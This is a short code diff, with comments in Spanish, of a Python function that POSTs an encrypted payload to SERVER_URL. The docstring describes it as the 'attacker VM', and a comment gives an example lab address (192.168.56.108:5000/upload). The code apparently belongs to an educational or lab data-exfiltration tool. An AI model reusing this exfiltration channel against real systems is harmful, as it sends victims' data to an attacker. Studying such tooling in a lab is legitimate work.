@@ -19,18 +19,18 @@ from datetime import datetime
 
 def send_encrypted_data(encrypted_payload: str) -> bool:
     """
-    Envía el payload ya cifrado al servidor.
-    El payload es un string base64 (resultado de crypto_utils.encrypt).
+    Envía el payload cifrado (base64) al receptor vía HTTP POST.
+    SERVER_URL apunta a la VM atacante (config.py). El JSON viaja en texto plano
+    pero el campo 'payload' es ilegible sin secret.key.
     """
     try:
         data = {
             "timestamp": datetime.utcnow().isoformat() + "Z",
             "payload": encrypted_payload,
-            # Puedes añadir más metadatos útiles (hostname, username, etc.)
         }
 
         response = requests.post(
-            SERVER_URL,
+            SERVER_URL,  # ej: http://192.168.56.108:5000/upload
             json=data,
             timeout=10,
             headers={"Content-Type": "application/json"}
